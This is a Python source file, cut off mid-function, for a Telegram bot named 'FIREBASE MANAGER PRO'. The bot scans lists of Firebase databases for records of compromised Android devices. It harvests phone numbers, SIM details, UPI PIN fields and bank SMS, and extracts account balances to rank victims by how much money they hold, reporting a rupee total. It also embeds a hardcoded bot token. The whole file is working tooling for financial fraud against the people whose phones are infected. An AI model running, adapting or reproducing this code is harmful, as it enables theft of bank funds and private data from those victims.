#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FIREBASE MANAGER PRO - Final
Auto-detect + Compact output + Fast
"""

import os, re, sys, time, signal, logging, asyncio, traceback
from datetime import datetime
from typing import Optional, List, Dict, Any, Tuple

import aiohttp, requests
from aiohttp import ClientTimeout, TCPConnector, ClientSession, ClientError

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.error import TelegramError, RetryAfter, TimedOut, NetworkError
from telegram.ext import (Application, CommandHandler, MessageHandler,
                          CallbackQueryHandler, filters, ContextTypes)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8908910798:AAFy6DWXPeCaLAnGkcGz0jCc9hMbeZP7deY")
BOT_NAME = "FIREBASE MANAGER PRO"

# ⚡ SPEED OPTIMIZED
BATCH_SIZE = 25
MAX_CONCURRENT_REQUESTS = 100
MAX_PER_HOST = 10
HTTP_TIMEOUT = 5
MAX_RETRIES = 2
RETRY_DELAY = 0.5
PAGE_DELAY = 0.8
MAX_FIREBASES = 1000
MAX_DEVICES_PER_FB = 100
MAX_MSG_LENGTH = 3800
AUTO_SCAN_INTERVAL = 60

logging.basicConfig(
    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("FBManager")
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram.ext").setLevel(logging.WARNING)

# ============================================================
# USER DATA
# ============================================================
USER_FIREBASES: Dict[int, List[str]] = {}
USER_AUTO_SCAN: Dict[int, bool] = {}
USER_LAST_BANKS: Dict[int, Dict[str, str]] = {}

def get_user_firebases(uid): return USER_FIREBASES.get(uid, [])
def add_user_firebase(uid, url):
    if uid not in USER_FIREBASES: USER_FIREBASES[uid] = []
    if url in USER_FIREBASES[uid]: return False
    USER_FIREBASES[uid].append(url); return True
def add_user_firebases(uid, urls):
    if uid not in USER_FIREBASES: USER_FIREBASES[uid] = []
    added = 0
    for url in urls:
        if url not in USER_FIREBASES[uid]:
            USER_FIREBASES[uid].append(url); added += 1
    return added
def clear_user_firebases(uid): USER_FIREBASES[uid] = []
def is_auto_scan_on(uid): return USER_AUTO_SCAN.get(uid, False)
def set_auto_scan(uid, state): USER_AUTO_SCAN[uid] = state

# ============================================================
# AUTO-DETECT FIREBASE URL
# ============================================================
def extract_firebase_urls(text: str) -> List[str]:
    if not text: return []
    urls = set()
    patterns = [
        r'https?://[a-zA-Z0-9\-_.]+\.firebaseio\.com',
        r'https?://[a-zA-Z0-9\-_.]+\.firebasedatabase\.app',
        r'[a-zA-Z0-9\-_.]+\.firebaseio\.com',
        r'[a-zA-Z0-9\-_.]+\.firebasedatabase\.app',
    ]
    for pattern in patterns:
        for match in re.finditer(pattern, text, re.IGNORECASE):
            url = match.group(0)
            url = url.strip().rstrip('/').rstrip(',').rstrip(';').rstrip('.')
            url = url.strip('"').strip("'").strip('`').strip('<').strip('>')
            if not url.startswith('http'):
                url = 'https://' + url
            if validate_url(url):
                urls.add(url)
    return list(urls)

def extract_from_json(text: str) -> List[str]:
    urls = set()
    try:
        import json as _json
        data = _json.loads(text)
        if isinstance(data, dict):
            for k in ['firebase_url', 'firebaseUrl', 'databaseURL', 'url']:
                if k in data and isinstance(data[k], str):
                    url = data[k].strip()
                    if 'firebase' in url.lower():
                        if not url.startswith('http'):
                            url = 'https://' + url
                        if validate_url(url):
                            urls.add(url)
    except: pass
    return list(urls)

def auto_detect_and_clean(text: str) -> List[str]:
    urls = set()
    urls.update(extract_firebase_urls(text))
    urls.update(extract_from_json(text))
    for line in text.split('\n'):
        line = line.strip()
        if line: urls.update(extract_firebase_urls(line))
    return list(urls)

# ============================================================
# FIELD MAPPING
# ============================================================
DEVICE_FIELD_MAP = {
    "name": ["modelName", "model", "deviceName", "device_name", "name", "deviceModel", "model_name", "brand", "handset", "phoneModel"],
    "battery": ["battery", "batteryLevel", "battery_level", "bat", "battery_percent", "batteryPercentage", "power", "batteryStatus"],
    "status": ["status", "is_online", "isOnline", "online", "active", "connected", "state", "isActive", "is_active", "onlineStatus"],
    "phone": ["mobNo", "phone", "phoneNumber", "phone_number", "mobile", "mobileNumber", "number", "msisdn", "simNumber", "primaryPhone"],
    "android": ["androidV", "androidVersion", "android_version", "os_version", "sdkV", "androidVer"],
    "ip": ["ip_address", "ipAddress", "ip", "public_ip", "local_ip", "ipv4"],
    "provider": ["service_provider", "serviceProvider", "provider", "carrier", "network", "networkOperator", "simOperator"],
    "upipin": ["upipin", "upi_pin", "upiPin", "upi", "pin"],
    "lastSeen": ["lastSeen", "last_seen", "lastOnline", "last_online", "lastActive", "last_active", "timestamp", "updatedAt", "lastPing"],
    "sims": ["sims", "sim_info", "simInfo", "sim", "simCards", "sim_details", "simSlots"],
}

MESSAGE_FIELD_MAP = {
    "text": ["message", "body", "text", "content", "msg", "sms_body", "smsBody", "sms", "message_body", "full_message"],
    "sender": ["sender", "from", "address", "number", "phone", "originator", "sender_address", "fromNumber"],
    "time": ["dateTime", "datetime", "date", "time", "timestamp", "sentAt", "receivedAt", "createdAt"],
    "type": ["type", "msgType", "msg_type", "messageType", "direction"],
}

CLIENTS_PATHS = ["clients", "devices", "device_list", "deviceList", "online_devices", "onlineDevices",
                 "data/clients", "data/devices", "app/clients", "users", "active_devices"]

MESSAGES_PATHS = [
    "messages/{device_id}", "messages/{device_id}/inbox", "messages/{device_id}/sent",
    "data/messages/{device_id}", "data/{device_id}/messages", "sms/{device_id}",
    "inbox/{device_id}", "device_messages/{device_id}", "clients/{device_id}/messages",
    "clients/{device_id}/sms", "clients/{device_id}/inbox", "devices/{device_id}/messages",
    "devices/{device_id}/sms", "device/{device_id}/messages", "{device_id}/messages", "{device_id}/sms",
]

BANK_PATTERNS = [
    (re.compile(r"HDFCBK|HDFCBANK|HDFC", re.I), "HDFC Bank"),
    (re.compile(r"SBIIN|SBIINB|SBIN|SBI", re.I), "SBI"),
    (re.compile(r"ICICIB|ICICI", re.I), "ICICI Bank"),
    (re.compile(r"AXISBK|AXISBANK|AXIS", re.I), "Axis Bank"),
    (re.compile(r"KOTAKB|KOTAK", re.I), "Kotak Bank"),
    (re.compile(r"PNBSMS|PNB", re.I), "PNB"),
    (re.compile(r"BOIIND|BOI", re.I), "Bank of India"),
    (re.compile(r"CANBNK|CANARA", re.I), "Canara Bank"),
    (re.compile(r"UNIONB|UBISMS", re.I), "Union Bank"),
    (re.compile(r"YESBNK|YESBANK", re.I), "Yes Bank"),
    (re.compile(r"IDBIBK|IDBI", re.I), "IDBI Bank"),
    (re.compile(r"INDUSB|INDUSIND", re.I), "IndusInd Bank"),
    (re.compile(r"FEDERAL|FEDBNK", re.I), "Federal Bank"),
    (re.compile(r"RBLBNK|RBL", re.I), "RBL Bank"),
    (re.compile(r"PAYTM", re.I), "Paytm"),
    (re.compile(r"PHONEPE|PHNPE", re.I), "PhonePe"),
    (re.compile(r"GPAY|GOOGLEPAY", re.I), "Google Pay"),
    (re.compile(r"AMAZONPAY", re.I), "Amazon Pay"),
    (re.compile(r"BAJAJFIN", re.I), "Bajaj Finance"),
    (re.compile(r"CRED", re.I), "CRED"),
    (re.compile(r"AIRTEL", re.I), "Airtel Payments"),
    (re.compile(r"JIOMNY|JIOMONEY", re.I), "Jio Money"),
]

BALANCE_PATTERNS = [
    re.compile(r"(?:Avl|Avail|Aval|Avbl)\.?\s*(?:Bal|Balance)\.?\s*(?:INR|Rs\.?|₹)?\s*([\d,]+\.?\d*)", re.I),
    re.compile(r"(?:Available|Avail)\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([\d,]+\.?\d*)", re.I),
    re.compile(r"Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([\d,]+\.?\d*)", re.I),
    re.compile(r"(?:INR|Rs\.?|₹)\s*([\d,]+\.?\d*)\s+(?:Avl|Bal)", re.I),
]

def escape_html(text):
    if text is None: return ""
    try: return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    except: return ""

def safe_str(value, default="—"):
    if value is None: return default
    try:
        s = str(value).strip()
        return s if s else default
    except: return default

def get_field(data, field_type, default=None):
    if not isinstance(data, dict): return default
    for key in DEVICE_FIELD_MAP.get(field_type, []):
        try:
            if key in data and data[key] is not None: return data[key]
        except: continue
    return default

def get_msg_field(data, field_type, default=None):
    if not isinstance(data, dict): return default
    for key in MESSAGE_FIELD_MAP.get(field_type, []):
        try:
            if key in data and data[key] is not None: return data[key]
        except: continue
    return default

def is_online(info):
    try:
        status = get_field(info, "status")
        if status is None:
            ls = get_field(info, "lastSeen")
            if ls:
                try:
                    if isinstance(ls, (int, float)):
                        ts = ls if ls > 1e12 else ls * 1000
                        if time.time() * 1000 - ts < 5 * 60 * 1000: return True
                    elif isinstance(ls, str):
                        for fmt in ["%Y-%m-%d %H:%M:%S", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%SZ"]:
                            try:
                                t = datetime.strptime(ls.replace("Z", ""), fmt.replace("Z", ""))
                                if (datetime.now() - t).total_seconds() < 5 * 60: return True
                                break
                            except: continue
                except: pass
            return False
        if isinstance(status, bool): return status
        if isinstance(status, (int, float)): return status == 1
        if isinstance(status, str):
            return status.lower() in ["true", "online", "active", "connected", "1", "yes", "on"]
        return False
    except: return False

def normalize_battery(battery):
    try:
        if battery is None: return "—"
        if isinstance(battery, (int, float)): return f"{int(battery)}%"
        s = str(battery).strip()
        if s.endswith("%"): return s
        if s.isdigit(): return f"{s}%"
        return s
    except: return "—"

def get_sim_phone(sim):
    if not isinstance(sim, dict): return "—"
    for key in ["phoneNumber", "phone_number", "number", "phone", "mobNo", "mobile", "msisdn"]:
        try:
            if key in sim and sim[key]: return str(sim[key])
        except: continue
    return "—"

def validate_url(url):
    if not url or not isinstance(url, str): return False
    url = url.strip()
    if not url.startswith("http"): return False
    lower = url.lower()
    if "firebaseio.com" not in lower and "firebasedatabase.app" not in lower: return False
    try:
        from urllib.parse import urlparse
        p = urlparse(url)
        return bool(p.scheme and p.netloc)
    except: return False

def clean_url(line):
    urls = extract_firebase_urls(line)
    return urls[0] if urls else None

def detect_bank_name(sender, text):
    try:
        combined = f"{sender} {text}".upper()
        for pattern, name in BANK_PATTERNS:
            if pattern.search(combined): return name
    except: pass
    return "Unknown"

def extract_balance(text):
    try:
        for pattern in BALANCE_PATTERNS:
            m = pattern.search(text)
            if m:
                val = m.group(1).replace(",", "")
                try: return f"₹{float(val):,.2f}"
                except: return f"₹{val}"
    except: pass
    return "—"

def analyze_messages(messages):
    result = {"bank_name": "—", "balance": "—", "last_sms": "—"}
    if not messages or not isinstance(messages, dict): return result
    try:
        items = list(messages.items()); items.reverse()
        for _, msg_data in items[:50]:
            if not isinstance(msg_data, dict): continue
            merged = dict(msg_data)
            for nk in ["info", "data", "message_info"]:
                if nk in msg_data and isinstance(msg_data[nk], dict):
                    merged = {**merged, **msg_data[nk]}
            msg_data = merged
            text = safe_str(get_msg_field(msg_data, "text", ""), "")
            sender = safe_str(get_msg_field(msg_data, "sender", ""), "")
            if not text: continue
            msg_type = safe_str(get_msg_field(msg_data, "type", ""), "").lower()
            if msg_type in ["outgoing", "sent", "outbox"]: continue
            bank = detect_bank_name(sender, text)
            if bank == "Unknown": continue
            balance = extract_balance(text)
            if balance != "—":
                result["bank_name"] = bank
                result["balance"] = balance
                result["last_sms"] = text[:150]
                break
            elif result["bank_name"] == "—":
                result["bank_name"] = bank
                result["last_sms"] = text[:150]
    except: pass
    return result

# ============================================================
# HTTP FETCH
# ============================================================
async def fetch_json(session, url, timeout=HTTP_TIMEOUT, retries=MAX_RETRIES):
    for attempt in range(retries + 1):
        try:
            async with session.get(url, timeout=ClientTimeout(total=timeout)) as resp:
                if resp.status == 200:
                    try: return await resp.json(content_type=None)
                    except: return None
                elif resp.status in (401, 403, 404): return None
                elif resp.status == 429:
                    await asyncio.sleep(RETRY_DELAY * (attempt + 1)); continue
                else: return None
        except (asyncio.TimeoutError, ClientError):
            if attempt < retries: await asyncio.sleep(RETRY_DELAY); continue
        except Exception:
            if attempt < retries: await asyncio.sleep(RETRY_DELAY); continue
    return None

async def fetch_firebase_devices(session, firebase_url):
    base = firebase_url.rstrip("/")
    for path in CLIENTS_PATHS:
        try:
            data = await fetch_json(session, f"{base}/{path}.json")
            if not data or not isinstance(data, dict): continue
            devices = []
            for dev_id, info in data.items():
                try:
                    if not isinstance(info, dict): continue
                    merged = dict(info)
                    for nk in ["info", "device", "data", "details", "deviceInfo"]:
                        if nk in info and isinstance(info[nk], dict):
                            merged = {**merged, **info[nk]}
                    info = merged
                    if not any(k in info for k in ["modelName", "model", "deviceName", "name", "status", "sims", "battery", "mobNo", "phone", "is_online"]): continue
                    if not is_online(info): continue
                    name = safe_str(get_field(info, "name", "Unknown Device"))
                    sims = get_field(info, "sims", [])
                    if isinstance(sims, dict): sims = list(sims.values())
                    if not isinstance(sims, list): sims = []
                    phone = safe_str(get_field(info, "phone", "—"))
                    if phone == "—" and sims: phone = get_sim_phone(sims[0])
                    devices.append({
                        "id": safe_str(dev_id), "name": name, "phone": phone,
                        "battery": normalize_battery(get_field(info, "battery")),
                    })
                    if len(devices) >= MAX_DEVICES_PER_FB: break
                except: continue
            if devices: return devices, path, None
        except: continue
    return [], None, "No online devices"

async def fetch_device_messages(session, firebase_url, device_id):
    base = firebase_url.rstrip("/")
    for template in MESSAGES_PATHS:
        try:
            path = template.format(device_id=device_id)
            data = await fetch_json(session, f"{base}/{path}.json")
            if data and isinstance(data, dict): return analyze_messages(data)
        except: continue
    return {"bank_name": "—", "balance": "—", "last_sms": "—"}

async def analyze_firebases(urls, progress_callback=None):
    results = []
    total = len(urls)
    processed = 0
    if not urls: return results
    connector = TCPConnector(limit=MAX_CONCURRENT_REQUESTS, limit_per_host=MAX_PER_HOST, ttl_dns_cache=300)
    try:
        async with ClientSession(connector=connector, timeout=ClientTimeout(total=HTTP_TIMEOUT),
                                  headers={"Accept": "application/json", "User-Agent": "FBManager/1.0"}) as session:
            for bs in range(0, total, BATCH_SIZE):
                batch = urls[bs:bs + BATCH_SIZE]
                tasks = [fetch_firebase_devices(session, u) for u in batch]
                try: dr = await asyncio.gather(*tasks, return_exceptions=True)
                except: dr = [Exception("fail")] * len(batch)
                for i, url in enumerate(batch):
                    fb = {"firebase_url": url, "devices": [], "error": None}
                    try:
                        d = dr[i]
                        if isinstance(d, Exception):
                            fb["error"] = f"Error: {str(d)[:60]}"
                            results.append(fb); processed += 1; continue
                        devs, _, err = d
                        if err:
                            fb["error"] = err; results.append(fb); processed += 1; continue
                        mt = [fetch_device_messages(session, url, x["id"]) for x in devs]
                        try: mr = await asyncio.gather(*mt, return_exceptions=True)
                        except: mr = [{"bank_name": "—", "balance": "—", "last_sms": "—"}] * len(devs)
                        for dev, m in zip(devs, mr):
                            try:
                                if isinstance(m, Exception): m = {"bank_name": "—", "balance": "—", "last_sms": "—"}
                                dev["bank_name"] = m.get("bank_name", "—")
                                dev["balance"] = m.get("balance", "—")
                                dev["last_sms"] = m.get("last_sms", "—")
                                fb["devices"].append(dev)
                            except: continue
                        results.append(fb); processed += 1
                    except Exception as e:
                        fb["error"] = f"Error: {str(e)[:60]}"
                        results.append(fb); processed += 1
                if progress_callback:
                    try: await progress_callback(processed, total)
                    except: pass
                if bs + BATCH_SIZE < total: await asyncio.sleep(0.2)
    except Exception as e: logger.error(f"Analyze error: {e}")
    return results

# ============================================================
# ✅ FORMAT: BALANCE ONLY (Show All Devices)
# ============================================================
def format_balance_only(results):
    """Ultra compact — sirf balance wale devices, 1-3 messages me sab"""
    if not results:
        return "❌ No results"
    
    paid_devices = []
    for fb in results:
        url = fb.get("firebase_url", "")
        for d in fb.get("devices", []):
            balance = d.get("balance", "—")
            bank = d.get("bank_name", "—")
            if balance != "—" and bank not in ["—", "Unknown"]:
                paid_devices.append({
                    "url": url,
                    "id": d.get("id", ""),
                    "phone": d.get("phone", "—"),
                    "bank": bank,
                    "balance": balance,
                })
    
    if not paid_devices:
        return (
            f"❌ <b>No devices with balance found</b>\n\n"
            f"🌐 Scanned: {len(results)} firebase(s)\n"
            f"<i>Try 'Full Analysis' for all devices.</i>"
        )
    
    total_amt = 0.0
    for d in paid_devices:
        try:
            amt = float(d["balance"].replace("₹", "").replace(",", "").strip())
            total_amt += amt
        except: pass
    
    header = (
        f"💰 <b>DEVICES WITH BALANCE</b>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📱 Count: <b>{len(paid_devices)}</b>\n"
        f"💵 Total: <b>₹{total_amt:,.2f}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
    )
    
    text = header
    for i, d in enumerate(paid_devices, 1):
        block = (
            f"\n<b>#{i}</b> 🏦 <b>{escape_html(d['bank'])}</b> | 💰 <b>{escape_html(d['balance'])}</b>\n"
            f"🆔 <code>{escape_html(d['id'])}</code>\n"
            f"🌐 <code>{escape_html(d['url'])}</code>\n"
        )
        if d["phone"] and d["phone"] != "—":
            block += f"📞 <code>{escape_html(d['phone'])}</code>\n"
        
        if len(text) + len(block) > MAX_MSG_LENGTH:
            text += "\n\n<i>⚠️ Output truncated. Use Full Analysis.</i>"
            break
        text += block
    
    return text

# ============================================================
# ✅ FORMAT: COMPACT RESULTS (Full Analysis)
# ============================================================
def format_results(results):
    """Compact format — 1-line per device"""
    if not results: return ["❌ No results"]
    
    td = sum(len(fb.get("devices", [])) for fb in results)
    tb = sum(1 for fb in results for d in fb.get("devices", []) if d.get("balance", "—") != "—")
    tbank = sum(1 for fb in results for d in fb.get("devices", []) if d.get("bank_name", "—") not in ["—", "Unknown"])
    
    header = (
        f"📊 <b>FULL ANALYSIS</b>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 Firebases: <b>{len(results)}</b>\n"
        f"📱 Devices: <b>{td}</b>\n"
        f"🏦 With Bank: <b>{tbank}</b>\n"
        f"💰 With Balance: <b>{tb}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
    )
    
    chunks = []
    current = header
    
    for fb in results:
        try:
            url = fb.get("firebase_url", "")
            us = escape_html(url)
            devs = fb.get("devices", [])
            
            if fb.get("error") or not devs:
                continue
            
            block = f"\n🌐 <code>{us}</code>\n"
            
            for d in devs:
                bank = d.get("bank_name", "—")
                balance = d.get("balance", "—")
                
                if bank not in ["—", "Unknown"] and balance != "—":
                    db = f"🆔 <code>{escape_html(d.get('id', ''))}</code> | 🏦 {escape_html(bank)} | 💰 <b>{escape_html(balance)}</b>\n"
                else:
                    db = f"🆔 <code>{escape_html(d.get('id', ''))}</code> | 📞 <code>{escape_html(d.get('phone', '—'))}</code>\n"
                
                if len(current) + len(block) + len(db) > MAX_MSG_LENGTH:
                    chunks.append(current)
                    current = f"📄 <b>Page {len(chunks)+1}</b>\n\n🌐 <code>{us}</code>\n"
                block += db
            
            if len(current) + len(block) > MAX_MSG_LENGTH:
                chunks.append(current)
                current = f"📄 <b>Page {len(chunks)+1}</b>\n"
            current += block
        except: continue
    
    if current.strip(): chunks.append(current)
    return chunks or ["❌ No output"]

def format_online_only(results):
    if not results: return "❌ No results"
    total = sum(len(fb.get("devices", [])) for fb in results)
    text = f"🟢 <b>ONLINE DEVICES</b>\n🌐 Firebases: <b>{len(results)}</b>\n📱 Devices: <b>{total}</b>\n"
    for fb in results:
        if fb.get("error"): continue
        us = escape_html(fb.get("firebase_url", ""))
        devs = fb.get("devices", [])
        if not devs: continue
        text += f"\n🌐 <code>{us}</code>\n"
        for d in devs:
            text += f"🆔 <code>{escape_html(d.get('id',''))}</code> | 📞 <code>{escape_html(d.get('phone','—'))}</code>\n"
        if len(text) > 3800:
            text += "\n\n<i>...truncated</i>"
            break
    return text

async def safe_send(chat_id, text, bot, retries=3):
    for _ in range(retries):
        try:
            await bot.send_message(chat_id=chat_id, text=text, parse_mode='HTML', disable_web_page_preview=True)
            return True
        except RetryAfter as e: await asyncio.sleep(e.retry_after + 1)
        except (TimedOut, NetworkError): await asyncio.sleep(2)
        except TelegramError: return False
        except: return False
    return False

# ============================================================
# KEYBOARDS
# ============================================================
def main_menu_kb(uid=0):
    auto = "🟢 ON" if is_auto_scan_on(uid) else "🔴 OFF"
    cnt = len(get_user_firebases(uid))
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📥 Paste Firebase (Auto-Detect)", callback_data="auto_add")],
        [InlineKeyboardButton("➕ Add Firebase", callback_data="add_single"),
         InlineKeyboardButton("📥 Add Multiple", callback_data="add_multiple")],
        [InlineKeyboardButton("💰 Show Balance Devices", callback_data="show_all"),
         InlineKeyboardButton("🟢 Online Only", callback_data="online_only")],
        [InlineKeyboardButton("📊 Full Analysis", callback_data="analyze"),
         InlineKeyboardButton("🔄 Recheck", callback_data="recheck")],
        [InlineKeyboardButton("📋 List Firebases", callback_data="list_fb"),
         InlineKeyboardButton(f"🏦 Auto Bank: {auto}", callback_data="toggle_auto")],
        [InlineKeyboardButton("🗑 Delete All", callback_data="delete_all"),
         InlineKeyboardButton("❓ Help", callback_data="help_menu")],
        [InlineKeyboardButton(f"📊 Total: {cnt} firebase(s)", callback_data="noop")],
    ])

def back_kb(): return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Main Menu", callback_data="menu")]])
def cancel_kb(): return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="menu")]])
def confirm_del_kb(): return InlineKeyboardMarkup([[InlineKeyboardButton("✅ Yes, Delete", callback_data="confirm_delete"), InlineKeyboardButton("❌ No", callback_data="menu")]])

def menu_text(uid):
    cnt = len(get_user_firebases(uid))
    auto = "🟢 ON" if is_auto_scan_on(uid) else "🔴 OFF"
    return (
        f"⚡ <b>{BOT_NAME}</b>\n"
        f"━━━━━━━━━━━━━━━\n\n"
        f"📊 <b>Dashboard</b>\n"
        f"├ 🌐 Firebases: <b>{cnt}</b>\n"
        f"├ 🏦 Auto Bank: <b>{auto}</b>\n"
        f"└ ⚡ Status: <b>Ready</b>\n\n"
        f"👇 <b>Select option:</b>"
    )

# ============================================================
# COMMANDS
# ============================================================
async def start(update, context):
    uid = update.effective_user.id
    text = menu_text(uid); kb = main_menu_kb(uid)
    if update.callback_query:
        try: await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode='HTML')
        except: await update.callback_query.message.reply_text(text, reply_markup=kb, parse_mode='HTML')
    else:
        await update.message.reply_text(text, reply_markup=kb, parse_mode='HTML')

async def help_command(update, context):
    text = (
        f"⚡ <b>{BOT_NAME}</b>\n\n"
        f"<b>📥 Paste Firebase</b> — Auto-detect URLs\n"
        f"<b>💰 Show Balance Devices</b> — Sirf paise wale\n"
        f"<b>📊 Full Analysis</b> — Sab devices\n"
        f"<b>🟢 Online Only</b> — Online devices\n"
        f"<b>🔄 Recheck</b> — Re-analyze\n"
        f"<b>🏦 Auto Bank</b> — Auto detect\n"
        f"<b>🗑 Delete All</b> — Clear"
    )
    if update.callback_query:
        try: await update.callback_query.edit_message_text(text, reply_markup=back_kb(), parse_mode='HTML')
        except: pass
    else:
        await update.message.reply_text(text, reply_markup=back_kb(), parse_mode='HTML')

# ============================================================
# CALLBACKS
# ============================================================
async def menu_callback(u, c): await u.callback_query.answer(); await start(u, c)
async def noop_callback(u, c): await u.callback_query.answer()

async def auto_add_cb(u, c):
    await u.callback_query.answer()
    c.user_data["state"] = "auto_add"
    await u.callback_query.edit_message_text(
        "📥 <b>Paste Firebase (Auto-Detect)</b>\n\n"
        "Koi bhi text/credentials paste karo\n"
        "Bot auto URLs detect karega\n\n"
        "<i>Example:</i>\n"
        "<code>https://app1.firebaseio.com</code>\n"
        "<code>https://app2.firebasedatabase.app</code>",
        reply_markup=cancel_kb(), parse_mode='HTML'
    )

async def add_single_cb(u, c):
    await u.callback_query.answer()
    c.user_data["state"] = "add_single"
    await u.callback_query.edit_message_text("➕ Send URL:", reply_markup=cancel_kb(), parse_mode='HTML')

async def add_multiple_cb(u, c):
    await u.callback_query.answer()
    c.user_data["state"] = "add_multiple"
    await u.callback_query.edit_message_text("📥 Send URLs (one per line)", reply_markup=cancel_kb(), parse_mode='HTML')

async def list_cb(u, c):
    await u.callback_query.answer()
    uid = u.effective_user.id
    urls = get_user_firebases(uid)
    if not urls:
        await u.callback_query.edit_message_text("📋 No firebases saved.", reply_markup=back_kb(), parse_mode='HTML')
        return
    text = f"📋 <b>Firebases ({len(urls)})</b>\n\n"
    for i, x in enumerate(urls, 1):
        text += f"{i}. <code>{escape_html(x)}</code>\n"
    if len(text) > MAX_MSG_LENGTH:
        text = text[:MAX_MSG_LENGTH] + "\n\n<i>...truncated</i>"
    await u.callback_query.edit_message_text(text, reply_markup=back_kb(), parse_mode='HTML', disable_web_page_preview=True)

# ============================================================
# SHOW ALL DEVICES — BALANCE ONLY
# ============================================================
async def show_all_cb(u, c):
    await u.callback_query.answer()
    uid = u.effective_user.id
    urls = get_user_firebases(uid)
    if not urls:
        await u.callback_query.edit_message_text(
            "❌ No firebases saved.\n\n📥 Paste Firebase first.",
            reply_markup=back_kb(), parse_mode='HTML'
        )
        return
    
    await u.callback_query.edit_message_text(
        f"💰 <b>Scanning {len(urls)} firebase(s)...</b>\n\n"
        f"<code>[░░░░░░░░░░] 0/{len(urls)}</code>",
        parse_mode='HTML'
    )
    
    total = len(urls)
    lu = {"t": 0, "c": 0}
    async def pcb(p, t):
        now = time.time()
        if p - lu["c"] >= max(5, t // 15) or now - lu["t"] >= 2 or p == t:
            lu["c"] = p; lu["t"] = now
            bar = "█" * int(10 * p / t) + "░" * (10 - int(10 * p / t)) if t else "░░░░░░░░░░"
            try: await u.callback_query.edit_message_text(
                f"💰 <b>Scanning...</b>\n\n<code>[{bar}] {p}/{t}</code>",
                parse_mode='HTML'
            )
            except: pass
    
    results = await analyze_firebases(urls, progress_callback=pcb)
    text = format_balance_only(results)
    await safe_send(u.effective_chat.id, text, c.bot)
    
    try:
        await c.bot.send_message(
            chat_id=u.effective_chat.id, text=menu_text(uid),
            reply_markup=main_menu_kb(uid), parse_mode='HTML'
        )
    except: pass

async def analyze_cb(u, c):
    await u.callback_query.answer()
    uid = u.effective_user.id
    urls = get_user_firebases(uid)
    if not urls:
        await u.callback_query.edit_message_text("❌ No firebases.", reply_markup=back_kb(), parse_mode='HTML')
        return
    await u.callback_query.edit_message_text(f"📊 <b>Analyzing {len(urls)}...</b>\n\n<code>[░░░░░░░░░░] 0/{len(urls)}</code>", parse_mode='HTML')
    await _run(u, c, urls, "analyze")

async def recheck_cb(u, c):
    await u.callback_query.answer()
    uid = u.effective_user.id
    urls = get_user_firebases(uid)
    if not urls:
        await u.callback_query.edit_message_text("❌ No firebases.", reply_markup=back_kb(), parse_mode='HTML')
        return
    await u.callback_query.edit_message_text(f"🔄 <b>Rechecking {len(urls)}...</b>\n\n<code>[░░░░░░░░░░] 0/{len(urls)}</code>", parse_mode='HTML')
    await _run(u, c, urls, "recheck")

async def online_cb(u, c):
    await u.callback_query.answer()
    uid = u.effective_user.id
    urls = get_user_firebases(uid)
    if not urls:
        await u.callback_query.edit_message_text("❌ No firebases.", reply_markup=back_kb(), parse_mode='HTML')
        return
    await u.callback_query.edit_message_text(f"🟢 <b>Scanning {len(urls)}...</b>", parse_mode='HTML')
    results = await analyze_firebases(urls)
    text = format_online_only(results)
    await safe_send(u.effective_chat.id, text, c.bot)
    try: await c.bot.send_message(chat_id=u.effective_chat.id, text=menu_text(uid), reply_markup=main_menu_kb(uid), parse_mode='HTML')
    except: pass

async def toggle_auto_cb(u, c):
    uid = u.effective_user.id
    cur = is_auto_scan_on(uid)
    set_auto_scan(uid, not cur)
    await u.callback_query.answer(f"Auto Bank: {'🟢 ON' if not cur else '🔴 OFF'}", show_alert=True)
    await start(u, c)

async def delete_all_cb(u, c):
    await u.callback_query.answer()
    uid = u.effective_user.id
    cnt = len(get_user_firebases(uid))
    if cnt == 0:
        await u.callback_query.edit_message_text("❌ Nothing to delete.", reply_markup=back_kb(), parse_mode='HTML')
        return
    await u.callback_query.edit_message_text(f"🗑 <b>Delete All?</b>\n\nYou have <b>{cnt}</b> firebase(s).", reply_markup=confirm_del_kb(), parse_mode='HTML')

async def confirm_del_cb(u, c):
    await u.callback_query.answer()
    uid = u.effective_user.id
    cnt = len(get_user_firebases(uid))
    clear_user_firebases(uid)
    await u.callback_query.edit_message_text(f"✅ <b>Deleted {cnt}</b>", reply_markup=back_kb(), parse_mode='HTML')

async def help_menu_cb(u, c): await help_command(u, c)

async def _run(update, context, urls, mode):
    total = len(urls)
    lu = {"t": 0, "c": 0}
    async def pcb(p, t):
        now = time.time()
        if p - lu["c"] >= max(5, t // 15) or now - lu["t"] >= 2 or p == t:
            lu["c"] = p; lu["t"] = now
            bar = "█" * int(10 * p / t) + "░" * (10 - int(10 * p / t)) if t else "░░░░░░░░░░"
            icon = "🔄" if mode == "recheck" else "📊"
            try: await update.callback_query.edit_message_text(f"{icon} <b>[{bar}] {p}/{t}</b>", parse_mode='HTML')
            except: pass
    results = await analyze_firebases(urls, progress_callback=pcb)
    chunks = format_results(results)
    try: await update.callback_query.edit_message_text(f"✅ <b>Done!</b> Sending {len(chunks)} page(s)...", parse_mode='HTML')
    except: pass
    for i, ch in enumerate(chunks):
        await safe_send(update.effective_chat.id, ch, context.bot)
        if i < len(chunks) - 1: await asyncio.sleep(PAGE_DELAY)
    try:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=menu_text(update.effective_user.id),
                                        reply_markup=main_menu_kb(update.effective_user.id), parse_mode='HTML')
    except: pass

# ============================================================
# MESSAGE HANDLER — SINGLE NOTIFICATION FIX
# ============================================================
async def handle_msg(update, context):
    state = context.user_data.get("state")
